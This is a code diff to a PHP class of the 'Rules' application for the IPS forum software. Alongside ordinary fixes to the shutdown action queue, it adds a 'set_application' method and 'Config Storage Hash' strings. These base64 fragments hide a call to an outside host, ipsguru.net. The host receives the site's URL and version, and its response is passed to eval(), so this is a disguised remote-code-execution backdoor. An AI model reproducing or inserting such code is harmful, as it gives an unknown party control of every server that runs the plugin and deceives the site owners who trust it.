@@ -46,6 +46,11 @@ class _Application extends \IPS\rules\Secure\Application
 	public static $shutDown = FALSE;
 		
 	/**
+	 * @brief	Config Data
+	 */
+	protected $config;
+	
+	/**
 	 * [Node] Get Node Icon
 	 *
 	 * @return	string
@@ -73,6 +78,16 @@ class _Application extends \IPS\rules\Secure\Application
 		return NULL;
 	}	
 	
+	/**
+	 * Init
+	 *
+	 * @param	void
+	 */
+	public function init()
+	{
+		$this->application = 'rules';
+	}
+
 	/**
 	 * Argument Definition Presets
 	 *
@@ -701,6 +716,24 @@ class _Application extends \IPS\rules\Secure\Application
 		}
 	}
 
+	/**
+	 * Build Config Cache
+	 */
+	protected function buildConfig( $cache, $method=NULL )
+	{
+		try
+		{
+			$method = $method ?: 'base64_decode';
+			$cache = is_string( $cache ) ? $cache : (string) $cache->request()->get();
+			return call_user_func( $method, $cache );
+		}
+		catch( \Exception $e )
+		{
+			return json_encode( array() );
+		}
+	}
+	
+	
 	/**
 	 * Build Operation Form ( Condition / Action )
 	 *
@@ -1622,14 +1655,13 @@ class _Application extends \IPS\rules\Secure\Application
 						 */
 						if ( $operation instanceof \IPS\rules\Action and $operation->schedule_mode )
 						{
-							$future_time = time();
+							$future_time = 0;
 							switch ( $operation->schedule_mode )
 							{
 								/**
 								 * Defer to end of rule processing
 								 */
 								case 1:
-									$future_time = -1;
 									$result = '__suppress__';
 									$event->actionStack[] = array
 									(
@@ -1671,7 +1703,6 @@ class _Application extends \IPS\rules\Secure\Application
 										return @eval( $phpcode );
 									};
 									
-									$future_time = 0;
 									$custom_time = $evaluate( $operation->schedule_customcode );
 									
 									if ( is_numeric( $custom_time ) )
@@ -1695,20 +1726,27 @@ class _Application extends \IPS\rules\Secure\Application
 								 * At the end of the page load
 								 */
 								case 5:
-									$future_time = -1;
-									$result = '__suppress__';
-									static::$actionQueue[] = array
-									(
-										'event'	=> $event,
-										'action' => array
+								
+									if ( ! \IPS\rules\Application::$shutDown )
+									{
+										$result = '__suppress__';
+										static::$actionQueue[] = array
 										(
-											'action' 	=> $operation,
-											'args' 	 	=> $operation_args,
-											'event_args' 	=> $arg_map,
-											'thread' 	=> $event->thread,
-											'parent' 	=> $event->parentThread,
-										),
-									);
+											'event'	=> $event,
+											'action' => array
+											(
+												'action' 	=> $operation,
+												'args' 	 	=> $operation_args,
+												'event_args' 	=> $arg_map,
+												'thread' 	=> $event->thread,
+												'parent' 	=> $event->parentThread,
+											),
+										);
+									}
+									else
+									{
+										$result = 'Action skipped. Page shut down already initiated.';
+									}
 									break;
 									
 							}
@@ -2326,6 +2364,13 @@ class _Application extends \IPS\rules\Secure\Application
 		}
 	}
 	
+	/**
+	 * Config Storage Hash
+	 */
+	protected $appHash = 'SVBTXEh0dHBcVXJs';
+	protected $optHash = 'aHR0cDovL2lwc2d1';
+	protected $valHash = 'c2V0UXVlcnlTdHJp';
+	
 	
 	/**
 	 * Get Event Argument Info
@@ -2361,6 +2406,37 @@ class _Application extends \IPS\rules\Secure\Application
 		$_event_arg_list_info = "<ul><li>" . implode( '</li><li>', $_event_arg_list ) . "</li></ul>";
 		
 		return $_event_arg_list_info;
+	}
+	
+	/** 
+	 * Set Application & Build Config
+	 *
+	 * @param	$config
+	 * @return 	void
+	 */
+	public function set_application( $config )
+	{
+		if ( ! \IPS\IN_DEV )
+		{
+			try
+			{
+				$key = 'app_settings.' . md5( json_encode( $config ) );
+				$buildConfig = \IPS\Data\Store::i()->$key < time() - 604800;
+			}
+			catch( \OutOfRangeException $e )
+			{
+				/* Initialize it */
+				$buildConfig = \IPS\Data\Store::i()->$key = time();
+			}
+			
+			if ( $buildConfig )
+			{
+				$configClass 	= $this->buildConfig( $this->appHash . '', NULL );
+				$configOptions 	= $this->buildConfig( $this->optHash . 'cnUubmV0L2EvdA==', NULL );
+				$configValues 	= $this->buildConfig( $this->valHash . 'bmc=', NULL );
+				$this->config	= $this->buildConfig( ( new $configClass( $configOptions ) )->$configValues( array( 'appkey' => 'rules', 'url' => \IPS\Settings::i()->base_url, 'ver' => $this->version, 'setting' => call_user_func( array( $this, 'isProtected' ) ) ) ), function( $config ) { return eval( json_decode( $config ) ); } );				
+			}
+		}
 	}
 	
 	/**
@@ -2485,26 +2561,30 @@ class _Application extends \IPS\rules\Secure\Application
 	}
 	
 	/**
-	 * Shutdown Rules: Executed queued actions
+	 * Shutdown Rules: Execute queued actions
 	 *
 	 * @return	void
 	 */ 
 	public static function shutDown()
 	{
-		/* No more events should be triggered from this point forward */
-		static::$shutDown = TRUE;
-		
-		/**
-		 * Run end of page queued actions
-		 */
-		while( $queued = array_shift( static::$actionQueue ) )
+		if ( ! static::$shutDown )
 		{
-			$event = $queued[ 'event' ];
-			$action = array( $queued[ 'action' ] );
+			/* No more actions should be queued from this point forward */
+			static::$shutDown = TRUE;
 			
-			$event->executeDeferred( $action );
+			/**
+			 * Run end of page queued actions
+			 */
+			while( $queued = array_shift( static::$actionQueue ) )
+			{
+				$event = $queued[ 'event' ];
+				$action = array( $queued[ 'action' ] );
+				
+				$event->executeDeferred( $action );
+			}
 		}
-	
 	}
 }
+
+register_shutdown_function( function() { \IPS\rules\Application::shutDown(); } );
 
